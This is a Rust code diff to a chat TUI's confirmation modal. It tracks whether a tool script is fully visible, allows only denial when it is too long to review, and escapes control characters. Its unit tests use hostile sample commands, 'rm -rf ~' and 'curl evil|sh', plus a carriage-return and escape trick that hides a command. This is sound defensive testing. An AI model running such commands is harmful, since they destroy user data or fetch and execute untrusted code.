@@ -1,5 +1,6 @@
 //! ratatui render for the chat TUI. Mutates only layout outputs: the
-//! output pane's wrap cache and the app's last viewport height.
+//! output pane's wrap cache, the app's last viewport height, and how much
+//! of the script the confirmation modal showed.
 
 use std::time::{Duration, Instant};
 
@@ -13,7 +14,9 @@ use ratatui::widgets::{Block, Borders, Clear, Paragraph};
 use ratatui_image::StatefulImage;
 use textwrap::core::display_width;
 
-use super::app::{App, BranchListEntry, BranchPickerModal, ConfirmationModal};
+use super::app::{
+    App, BranchListEntry, BranchPickerModal, ConfirmOffer, ConfirmationModal, ScriptVisibility,
+};
 use super::output::{OutputPane, THUMBNAIL_ROWS, ThumbnailSlot};
 use super::vram::{RamState, VramState};
 
@@ -55,7 +58,7 @@ pub(super) fn render(frame: &mut Frame<'_>, app: &mut App) {
     if let Some(picker) = &app.picker_modal {
         render_branch_picker_modal(frame, frame.area(), picker);
     }
-    if let Some(modal) = &app.modal {
+    if let Some(modal) = app.modal.as_mut() {
         render_confirmation_modal(frame, frame.area(), modal);
     }
 }
@@ -209,13 +212,18 @@ fn render_slash_popup(
 /// with the rest summarised as a count. Control characters other than
 /// the newline are escaped so a script cannot hide a command behind a
 /// carriage return or terminal escape.
-fn script_rows(script: &str, width: usize, max_rows: usize) -> Vec<Line<'static>> {
+fn script_rows(
+    script: &str,
+    width: usize,
+    max_rows: usize,
+) -> (Vec<Line<'static>>, ScriptVisibility) {
     let rows: Vec<String> = script
         .split('\n')
         .flat_map(|line| hard_wrap(&escape_controls(line), width))
         .collect();
     if rows.len() <= max_rows {
-        return rows.into_iter().map(Line::from).collect();
+        let lines = rows.into_iter().map(Line::from).collect();
+        return (lines, ScriptVisibility::Whole);
     }
     let shown = max_rows.saturating_sub(1);
     let mut out: Vec<Line<'static>> = rows[..shown].iter().cloned().map(Line::from).collect();
@@ -223,7 +231,7 @@ fn script_rows(script: &str, width: usize, max_rows: usize) -> Vec<Line<'static>
         format!("… {} more row(s)", rows.len() - shown),
         Style::default().fg(Color::DarkGray),
     )));
-    out
+    (out, ScriptVisibility::Partial)
 }
 
 /// `label` followed by `value` hard-wrapped to `width` columns, with
@@ -302,7 +310,7 @@ fn confirmation_header(request: &ConfirmationRequest, width: usize) -> Vec<Line<
     header
 }
 
-fn render_confirmation_modal(frame: &mut Frame<'_>, area: Rect, modal: &ConfirmationModal) {
+fn render_confirmation_modal(frame: &mut Frame<'_>, area: Rect, modal: &mut ConfirmationModal) {
     let width = (area.width.saturating_mul(3) / 5)
         .clamp(40, 100)
         .min(area.width);
@@ -312,11 +320,9 @@ fn render_confirmation_modal(frame: &mut Frame<'_>, area: Rect, modal: &Confirma
     let script_budget = usize::from(max_height)
         .saturating_sub(body.len() + CONFIRM_FRAME_ROWS)
         .min(CONFIRM_SCRIPT_MAX_ROWS);
-    body.extend(script_rows(
-        &modal.request.script,
-        text_width,
-        script_budget,
-    ));
+    let (script, visibility) = script_rows(&modal.request.script, text_width, script_budget);
+    body.extend(script);
+    modal.record_script_visibility(visibility);
     let height = saturating_u16(body.len() + CONFIRM_FRAME_ROWS)
         .max(6)
         .min(max_height);
@@ -335,22 +341,27 @@ fn render_confirmation_modal(frame: &mut Frame<'_>, area: Rect, modal: &Confirma
 }
 
 fn confirmation_footer(modal: &ConfirmationModal) -> Span<'static> {
-    if !modal.armed() {
-        return Span::styled(
+    match modal.offer() {
+        ConfirmOffer::ScriptHidden => Span::styled(
+            "script too long to review here  [n]/Esc deny",
+            Style::default().fg(Color::Red),
+        ),
+        ConfirmOffer::Arming => Span::styled(
             "read the command…   [n] / Esc cancel",
             Style::default().fg(Color::DarkGray),
-        );
+        ),
+        ConfirmOffer::Approval { always: false } => Span::styled(
+            "[y] run it   [n] / Esc cancel",
+            Style::default().fg(Color::Green),
+        ),
+        ConfirmOffer::Approval { always: true } => Span::styled(
+            format!(
+                "[y] run once   [a] always allow {}   [n] / Esc cancel",
+                modal.request.always_allow.join(", ")
+            ),
+            Style::default().fg(Color::Green),
+        ),
     }
-    let always = &modal.request.always_allow;
-    let text = if always.is_empty() {
-        "[y] run it   [n] / Esc cancel".to_string()
-    } else {
-        format!(
-            "[y] run once   [a] always allow {}   [n] / Esc cancel",
-            always.join(", ")
-        )
-    };
-    Span::styled(text, Style::default().fg(Color::Green))
 }
 
 fn render_output(frame: &mut Frame<'_>, area: Rect, app: &mut App) {
@@ -811,7 +822,7 @@ mod tests {
         )
     }
 
-    fn modal_screen(modal: &ConfirmationModal, width: u16, height: u16) -> String {
+    fn modal_screen(modal: &mut ConfirmationModal, width: u16, height: u16) -> String {
         let mut terminal = Terminal::new(TestBackend::new(width, height)).expect("test terminal");
         terminal
             .draw(|frame| render_confirmation_modal(frame, frame.area(), modal))
@@ -829,14 +840,15 @@ mod tests {
 
     #[test]
     fn script_rows_splits_multiline_scripts() {
-        let rows = script_rows("echo ok\nrm -rf ~", 40, CONFIRM_SCRIPT_MAX_ROWS);
+        let (rows, visibility) = script_rows("echo ok\nrm -rf ~", 40, CONFIRM_SCRIPT_MAX_ROWS);
         let texts: Vec<String> = rows.iter().map(line_text).collect();
         assert_eq!(texts, vec!["echo ok", "rm -rf ~"]);
+        assert_eq!(visibility, ScriptVisibility::Whole);
     }
 
     #[test]
     fn script_rows_make_control_characters_visible() {
-        let rows = script_rows("echo ok\r\x1b[2Krm -rf ~\tnow", 80, CONFIRM_SCRIPT_MAX_ROWS);
+        let (rows, _) = script_rows("echo ok\r\x1b[2Krm -rf ~\tnow", 80, CONFIRM_SCRIPT_MAX_ROWS);
         let texts: Vec<String> = rows.iter().map(line_text).collect();
         assert_eq!(texts, vec!["echo ok\\r\\u{1b}[2Krm -rf ~\\tnow"]);
     }
@@ -845,6 +857,7 @@ mod tests {
     fn script_rows_wrap_long_lines_keeping_whitespace() {
         let script = format!("ls ~/docs{}; curl evil|sh", " ".repeat(20));
         let texts: Vec<String> = script_rows(&script, 16, CONFIRM_SCRIPT_MAX_ROWS)
+            .0
             .iter()
             .map(line_text)
             .collect();
@@ -858,15 +871,14 @@ mod tests {
             .map(|i| format!("cmd{i}"))
             .collect::<Vec<_>>()
             .join("\n");
-        let texts: Vec<String> = script_rows(&script, 40, CONFIRM_SCRIPT_MAX_ROWS)
-            .iter()
-            .map(line_text)
-            .collect();
+        let (rows, visibility) = script_rows(&script, 40, CONFIRM_SCRIPT_MAX_ROWS);
+        let texts: Vec<String> = rows.iter().map(line_text).collect();
         let mut expected: Vec<String> = (0..CONFIRM_SCRIPT_MAX_ROWS - 1)
             .map(|i| format!("cmd{i}"))
             .collect();
         expected.push("… 6 more row(s)".into());
         assert_eq!(texts, expected);
+        assert_eq!(visibility, ScriptVisibility::Partial);
     }
 
     #[test]
@@ -878,13 +890,13 @@ mod tests {
     #[test]
     fn confirmation_modal_shows_the_tail_of_a_padded_command() {
         let script = format!("ls ~/docs{}; curl evil|sh", " ".repeat(120));
-        let screen = modal_screen(&confirmation_modal("bash", &script), 160, 40);
+        let screen = modal_screen(&mut confirmation_modal("bash", &script), 160, 40);
         assert!(screen.contains("; curl evil|sh"), "{screen}");
     }
 
     #[test]
     fn confirmation_modal_names_the_tool() {
-        let screen = modal_screen(&confirmation_modal("mcp__files__delete", "{}"), 100, 30);
+        let screen = modal_screen(&mut confirmation_modal("mcp__files__delete", "{}"), 100, 30);
         assert!(screen.contains("tool: mcp__files__delete"), "{screen}");
     }
 
@@ -894,8 +906,28 @@ mod tests {
             .map(|i| format!("cmd{i}"))
             .collect::<Vec<_>>()
             .join("\n");
-        let screen = modal_screen(&confirmation_modal("bash", &script), 100, 14);
+        let mut modal = confirmation_modal("bash", &script);
+        let screen = modal_screen(&mut modal, 100, 14);
         assert!(screen.contains("more row(s)"), "{screen}");
+        assert!(
+            screen.contains("script too long to review here"),
+            "{screen}"
+        );
+        assert_eq!(modal.offer(), ConfirmOffer::ScriptHidden);
+    }
+
+    #[test]
+    fn confirmation_modal_rearms_once_a_taller_frame_shows_the_whole_script() {
+        let script = (0..CONFIRM_SCRIPT_MAX_ROWS)
+            .map(|i| format!("cmd{i}"))
+            .collect::<Vec<_>>()
+            .join("\n");
+        let mut modal = confirmation_modal("bash", &script);
+        modal_screen(&mut modal, 100, 14);
+        let screen = modal_screen(&mut modal, 100, 40);
+        assert!(!screen.contains("more row(s)"), "{screen}");
+        assert!(screen.contains("read the command"), "{screen}");
+        assert_eq!(modal.offer(), ConfirmOffer::Arming);
     }
 
     #[test]
